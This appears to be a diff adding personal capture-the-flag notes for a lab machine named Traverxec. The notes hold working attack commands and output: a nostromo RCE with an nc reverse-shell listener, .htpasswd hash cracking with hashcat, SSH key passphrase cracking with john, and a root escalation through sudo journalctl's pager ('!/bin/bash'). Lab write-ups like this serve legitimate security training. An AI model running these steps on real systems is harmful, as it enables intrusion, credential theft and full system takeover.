@@ -1,0 +1,111 @@
+http://10.10.10.165/Readme.txt/
+
+nostromo 1.9.6 - Remote Code Execution 
+
+//a vunl for the service to RCE, use nc to run reverseshell
+
+└─$ nc -nvlp 443                               
+listening on [any] 443 ...
+connect to [10.10.16.3] from (UNKNOWN) [10.10.10.165] 52060
+python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@traverxec:/usr/bin$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+cat .htpasswd
+david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+
+$ hashcat -m 500 hash.txt -a 0 ~/oscp/rockyou.txt 
+
+$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4menostromo 1.9.6
+//but this credential is not able to use to login. try other ways
+
+
+//view the conf, link the piblic_www to the home folder and under it.  what a brain hole.
+www-data@traverxec:/var/nostromo/conf$ ls -la /home/david/public_www
+ls -la /home/david/public_www
+total 16
+drwxr-xr-x 3 david david 4096 Oct 25  2019 .
+drwx--x--x 5 david david 4096 Oct 25  2019 ..
+-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
+drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
+
+www-data@traverxec:/home/david/public_www/protected-file-area$ tar -xzvf backup-ssh-identity-files.tgz -C /tmp/
+<a$ tar -xzvf backup-ssh-identity-files.tgz -C /tmp/           
+home/david/.ssh/
+home/david/.ssh/authorized_keys
+home/david/.ssh/id_rsa
+home/david/.ssh/id_rsa.pub
+www-data@traverxec:/home/david/public_www/protected-file-area$ ls /tmp
+ls /tmp
+home
+index.html
+linpeas.sh
+re.txt
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+└─$ ssh david@10.10.10.165 -i id_rsa
+Enter passphrase for key 'id_rsa': 
+david@10.10.10.165's password: 
+
+└─$ john --wordlist=~/oscp/rockyou.txt id_rsa
+Using default input encoding: UTF-8
+Loaded 25 password hashes with 25 different salts (cryptoSafe [AES-256-CBC])
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:25 DONE (2025-10-26 01:11) 0g/s 569115p/s 14227Kc/s 14227KC/s 02102265315..*7¡Vamos!
+Session completed. 
+  
+//use john to crack passphase       
+  
+┌──(ed㉿kali)-[/tmp]
+└─$ ssh2john id_rsa > ssh.john      
+                                                                                                    
+┌──(ed㉿kali)-[/tmp]
+└─$ john --wordlist=~/oscp/rockyou.txt ssh.john 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hunter           (id_rsa)     
+1g 0:00:00:00 DONE (2025-10-26 01:12) 25.00g/s 3600p/s 3600c/s 3600C/s daniela..sandra
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+└─$ ssh david@10.10.10.165 -i id_rsa 
+Enter passphrase for key 'id_rsa': 
+Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
+david@traverxec:~$ id
+uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+
+david@traverxec:~/bin$ cat server-stats.sh 
+#!/bin/bash
+
+cat /home/david/bin/server-stats.head
+echo "Load: `/usr/bin/uptime`"
+echo " "
+echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
+echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
+echo " "
+echo "Last 5 journal log lines:"
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
+
+david@traverxec:~/bin$ ls -la /usr/bin/journalctl
+-rwxr-xr-x 1 root root 67672 Aug 20  2019 /usr/bin/journalctl
+
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+//when the terminal is not big enough, less will be used for more pages to show the content. at this time we can type command, for jourlctl to run, like !/bin/bash from GtFObin
+
+david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+-- Logs begin at Sat 2025-10-25 23:01:38 EDT, end at Sun 2025-10-26 01:18:22 EDT. --
+Oct 26 00:12:00 traverxec sudo[20072]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/1 rus
+Oct 26 00:12:01 traverxec sudo[20072]: pam_unix(sudo:auth): conversation failed
+Oct 26 00:12:01 traverxec sudo[20072]: pam_unix(sudo:auth): auth could not identify password for [www-data]
+Oct 26 00:12:01 traverxec sudo[20072]: www-data : command not allowed ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=list
+Oct 26 00:12:01 traverxec nologin[20707]: Attempted login by UNKNOWN on UNKNOWN
+!/bin/bash
+root@traverxec:/home/david/bin# 
